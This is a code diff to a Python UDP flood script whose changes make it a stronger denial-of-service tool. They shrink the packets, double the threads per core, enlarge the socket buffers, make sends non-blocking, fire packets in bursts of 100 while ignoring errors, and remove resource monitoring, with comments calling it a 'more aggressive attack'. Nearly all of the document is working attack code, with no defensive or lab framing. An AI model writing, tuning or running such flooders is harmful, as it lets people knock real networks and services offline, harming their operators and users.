@@ -4,27 +4,28 @@ import time
 import sys
 import threading
 import multiprocessing
-import psutil
 from argparse import ArgumentParser
 
 class UDPFlooder:
     def __init__(self, target_ip, target_port, duration):
         self.target_ip = target_ip
         self.target_port = target_port
-        # Optimize packet size for maximum throughput
-        self.packet_size = 65507  # Maximum UDP packet size
+        # Smaller packet size for more packets
+        self.packet_size = 1024  # Reduced from 65507 to send more packets
         self.duration = duration
         self.sent_packets = 0
         self.running = False
-        # Calculate optimal thread count based on CPU cores
-        self.num_threads = multiprocessing.cpu_count() * 2
+        # Increased thread count for more aggressive attack
+        self.num_threads = multiprocessing.cpu_count() * 4  # Doubled thread count
 
     def create_socket(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            # Set socket options for maximum performance
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
+            # Increased socket buffer size
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB buffer
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            # Set socket to non-blocking mode
+            sock.setblocking(0)
             return sock
         except socket.error as e:
             print("Error creating socket: {}".format(e))
@@ -40,15 +41,31 @@ class UDPFlooder:
 
         self.running = True
         start_time = time.time()
+        packets_per_second = 0
+        last_time = time.time()
         
         try:
             while self.running and (time.time() - start_time) < self.duration:
                 try:
-                    sock.sendto(self.generate_packet(), (self.target_ip, self.target_port))
-                    self.sent_packets += 1
-                except socket.error as e:
-                    print("Error sending packet: {}".format(e))
-                    break
+                    # Send multiple packets in a loop without sleep
+                    for _ in range(100):  # Send 100 packets per iteration
+                        sock.sendto(self.generate_packet(), (self.target_ip, self.target_port))
+                        self.sent_packets += 1
+                        packets_per_second += 1
+                    
+                    # Calculate and display packets per second
+                    current_time = time.time()
+                    if current_time - last_time >= 1.0:
+                        sys.stdout.write("\rPackets sent: {} | PPS: {} | Elapsed: {:.1f}s".format(
+                            self.sent_packets, packets_per_second, current_time - start_time))
+                        sys.stdout.flush()
+                        packets_per_second = 0
+                        last_time = current_time
+                        
+                except socket.error:
+                    # Non-blocking socket will raise error when buffer is full
+                    # Just continue sending
+                    pass
         finally:
             sock.close()
             self.running = False
@@ -56,7 +73,8 @@ class UDPFlooder:
     def start(self):
         threads = []
         print("Starting attack with {} threads".format(self.num_threads))
-        print("Using maximum UDP packet size: {} bytes".format(self.packet_size))
+        print("Using packet size: {} bytes".format(self.packet_size))
+        print("Press Ctrl+C to stop")
         
         for _ in range(self.num_threads):
             thread = threading.Thread(target=self.flood)
@@ -65,20 +83,8 @@ class UDPFlooder:
             thread.start()
 
         try:
-            # Monitor progress and system resources
-            start_time = time.time()
             while any(t.is_alive() for t in threads):
-                elapsed = time.time() - start_time
-                if elapsed >= self.duration:
-                    break
-                time.sleep(1)
-                # Get system resource usage
-                cpu_percent = psutil.cpu_percent()
-                memory_percent = psutil.virtual_memory().percent
-                # Use sys.stdout.write for progress display
-                sys.stdout.write("\rPackets sent: {} | Elapsed: {:.1f}s | CPU: {}% | Memory: {}%".format(
-                    self.sent_packets, elapsed, cpu_percent, memory_percent))
-                sys.stdout.flush()
+                time.sleep(0.1)
         except KeyboardInterrupt:
             print("\nStopping flood...")
             self.running = False
@@ -100,7 +106,6 @@ def main():
         flooder = UDPFlooder(args.target_ip, args.target_port, args.duration)
         print("Starting UDP flood attack on {}:{}".format(args.target_ip, args.target_port))
         print("Duration: {} seconds".format(args.duration))
-        print("Press Ctrl+C to stop")
         flooder.start()
     except KeyboardInterrupt:
         print("\nAttack stopped by user")
